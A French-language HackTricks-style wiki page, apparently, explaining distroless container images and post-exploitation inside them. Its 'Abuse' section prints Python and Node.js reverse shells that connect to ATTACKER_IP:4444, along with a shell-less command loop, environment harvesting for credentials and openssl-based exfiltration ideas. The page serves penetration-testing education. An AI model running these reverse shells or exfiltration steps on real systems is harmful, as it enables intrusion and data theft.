# Conteneurs Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Une image de conteneur **distroless** est une image qui fournit les **composants d’exécution minimum requis pour exécuter une application spécifique**, tout en supprimant volontairement les outils habituels de la distribution, tels que les gestionnaires de paquets, les shells et de grands ensembles d’utilitaires userland génériques. En pratique, les images distroless contiennent souvent uniquement le binaire ou le runtime de l’application, ses bibliothèques partagées, les bundles de certificats et une arborescence de fichiers très réduite.

L’objectif n’est pas que distroless constitue une nouvelle primitive d’isolation du kernel. Distroless est une **stratégie de conception d’image**. Elle modifie ce qui est disponible **à l’intérieur** du système de fichiers du conteneur, et non la manière dont le kernel isole le conteneur. Cette distinction est importante, car distroless renforce principalement l’environnement en réduisant ce qu’un attacker peut utiliser après avoir obtenu une exécution de code. Elle ne remplace pas les namespaces, seccomp, les capabilities, AppArmor, SELinux ni aucun autre mécanisme d’isolation du runtime.

## Pourquoi Distroless Existe

Les images distroless sont principalement utilisées pour réduire :

- la taille de l’image
- la complexité opérationnelle de l’image
- le nombre de paquets et de binaires susceptibles de contenir des vulnérabilités
- le nombre d’outils de post-exploitation disponibles par défaut pour un attacker

C’est pourquoi les images distroless sont populaires dans les déploiements d’applications en production. Un conteneur qui ne contient aucun shell, aucun gestionnaire de paquets et presque aucun outil générique est généralement plus facile à évaluer sur le plan opérationnel et plus difficile à exploiter de manière interactive après une compromission.

Voici quelques familles d’images distroless connues :

- les images distroless de Google
- les images hardened/minimal de Chainguard

## Ce Que Distroless Ne Signifie Pas

Un conteneur distroless n’est **pas** :

- automatiquement rootless
- automatiquement non privilégié
- automatiquement en lecture seule
- automatiquement protégé par seccomp, AppArmor ou SELinux
- automatiquement à l’abri d’un container escape

Il reste possible d’exécuter une image distroless avec `--privileged`, un partage des namespaces de l’hôte, des bind mounts dangereux ou un runtime socket monté. Dans ce cas, l’image peut être minimale, mais le conteneur peut toujours être catastrophiquement non sécurisé. Distroless modifie la **surface d’attaque userland**, et non la **frontière de confiance du kernel**.

## Caractéristiques Opérationnelles Typiques

Lorsque vous compromettez un conteneur distroless, la première chose que vous remarquez généralement est que les hypothèses courantes cessent d’être vraies. Il peut n’y avoir ni `sh`, ni `bash`, ni `ls`, ni `id`, ni `cat`, et parfois même pas d’environnement basé sur libc qui se comporte comme le prévoit votre tradecraft habituel. Cela affecte à la fois l’offensive et la défense, car l’absence d’outils rend le debugging, la réponse aux incidents et la post-exploitation différents.

Les schémas les plus courants sont les suivants :

- le runtime de l’application est présent, mais presque rien d’autre
- les payloads basés sur un shell échouent, car aucun shell n’est disponible
- les one-liners d’enumeration courants échouent, car les binaires auxiliaires sont absents
- des protections du système de fichiers, telles qu’un rootfs en lecture seule ou `noexec` sur les emplacements tmpfs accessibles en écriture, sont souvent également présentes

C’est généralement cette combinaison qui amène les gens à parler de « weaponizing distroless ».

## Distroless Et La Post-Exploitation

Le principal défi offensif dans un environnement distroless n’est pas toujours le RCE initial. C’est souvent ce qui vient ensuite. Si le workload compromis permet l’exécution de code dans un langage runtime tel que Python, Node.js, Java ou Go, vous pouvez être en mesure d’exécuter une logique arbitraire, mais pas au moyen des workflows habituels centrés sur le shell, courants sur d’autres cibles Linux.

Cela signifie que la post-exploitation s’oriente souvent dans l’une des trois directions suivantes :

1. **Utiliser directement le langage runtime déjà présent** pour énumérer l’environnement, ouvrir des sockets, lire des fichiers ou préparer des payloads supplémentaires.
2. **Apporter vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si les emplacements accessibles en écriture sont montés avec `noexec`.
3. **Abuser des binaires déjà présents dans l’image** si l’application ou ses dépendances incluent quelque chose d’inattendu mais d’utile.

## Abuse

### Énumérer Le Runtime Dont Vous Disposez Déjà

Dans de nombreux conteneurs distroless, il n’y a pas de shell, mais il existe toujours un runtime d’application. Si la cible est un service Python, Python est présent. Si la cible est Node.js, Node est présent. Cela fournit souvent suffisamment de fonctionnalités pour énumérer les fichiers, lire les variables d’environnement, ouvrir des reverse shells et préparer une exécution en mémoire sans jamais invoquer `/bin/sh`.

Un exemple simple avec Python :
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un exemple simple avec Node.js :
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact :

- récupération des variables d’environnement, incluant souvent des credentials ou des endpoints de service
- énumération du système de fichiers sans `/bin/ls`
- identification des chemins accessibles en écriture et des secrets montés

### Reverse Shell Sans `/bin/sh`

Si l’image ne contient pas `sh` ou `bash`, un Reverse Shell classique basé sur un shell peut échouer immédiatement. Dans ce cas, utilisez le runtime du langage installé.

Python reverse shell :
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` n’existe pas, remplacez la dernière ligne par une exécution directe de commandes pilotée par Python ou par une boucle REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Encore une fois, si `/bin/sh` est absent, utilisez directement les API de système de fichiers, de processus et de réseau de Node au lieu de lancer un shell.

### Exemple complet : boucle de commandes Python sans shell

Si l’image contient Python mais aucun shell, une simple boucle interactive suffit souvent à conserver toutes les capacités de post-exploitation :
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Cela ne nécessite pas de binaire de shell interactif. Du point de vue de l'attaquant, l'impact est pratiquement identique à celui d'un shell basique : exécution de commandes, énumération et staging de payloads supplémentaires via le runtime existant.

### Exécution d'outils en mémoire

Les images Distroless sont souvent combinées avec :

- `readOnlyRootFilesystem: true`
- un tmpfs accessible en écriture mais `noexec`, tel que `/dev/shm`
- l'absence d'outils de gestion des packages

Cette combinaison rend peu fiables les workflows classiques consistant à « télécharger un binaire sur le disque puis l'exécuter ». Dans ces cas, les techniques d'exécution en mémoire deviennent la principale solution.

La page dédiée à ce sujet est :

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Les techniques les plus pertinentes sont :

- `memfd_create` + `execve` via des runtimes de scripting
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaires déjà présents dans l'image

Certaines images Distroless contiennent encore des binaires nécessaires au fonctionnement, qui deviennent utiles après une compromission. `openssl` est un exemple fréquemment observé, car les applications peuvent en avoir besoin pour des tâches liées à la cryptographie ou à TLS.

Un pattern de recherche rapide est :
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` est présent, il peut être utilisable pour :

- des connexions TLS sortantes
- l’exfiltration de données via un canal de sortie autorisé
- le staging de données de payload via des blobs encodés/chiffrés

L’abus exact dépend de ce qui est réellement installé, mais l’idée générale est que distroless ne signifie pas « aucun outil » ; cela signifie « bien moins d’outils qu’une image de distribution normale ».

## Vérifications

L’objectif de ces vérifications est de déterminer si l’image est réellement distroless en pratique et quels binaires du runtime ou auxiliaires sont encore disponibles pour la post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Ce qui est intéressant ici :

- Si aucun shell n'existe mais qu'un runtime tel que Python ou Node est présent, le post-exploitation doit s'orienter vers une exécution pilotée par le runtime.
- Si le système de fichiers racine est en lecture seule et que `/dev/shm` est accessible en écriture mais monté avec `noexec`, les techniques d'exécution en mémoire deviennent beaucoup plus pertinentes.
- Si des binaires auxiliaires tels que `openssl`, `busybox` ou `java` sont présents, ils peuvent fournir suffisamment de fonctionnalités pour bootstrapper un accès supplémentaire.

## Runtime Defaults

| Image / style de plateforme | État par défaut | Comportement typique | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Images de style Google distroless | Userland minimal par conception | Aucun shell, aucun package manager, uniquement les dépendances de l'application/runtime | ajout de layers de debugging, de sidecar shells, copie de busybox ou d'outils |
| Images minimales Chainguard | Userland minimal par conception | Surface de packages réduite, souvent centrée sur un seul runtime ou service | utilisation de `:latest-dev` ou de variantes de debug, copie d'outils pendant le build |
| Workloads Kubernetes utilisant des images distroless | Dépend de la configuration du Pod | Distroless ne concerne que le userland ; la security posture du Pod dépend toujours de la spec du Pod et des runtime defaults | ajout de conteneurs de debug éphémères, montages de l'hôte, paramètres de Pod privilégié |
| Docker / Podman exécutant des images distroless | Dépend des run flags | Filesystem minimal, mais la runtime security dépend toujours des flags et de la configuration du daemon | `--privileged`, partage des namespaces de l'hôte, montages de sockets du runtime, host binds accessibles en écriture |

Le point essentiel est que distroless est une **propriété de l'image**, et non une protection du runtime. Sa valeur vient de la réduction de ce qui est disponible dans le filesystem après une compromission.

## Related Pages

Pour les bypass du filesystem et de l'exécution en mémoire couramment nécessaires dans les environnements distroless :

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Pour les abus du runtime de conteneur, des sockets et des montages qui s'appliquent toujours aux workloads distroless :

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
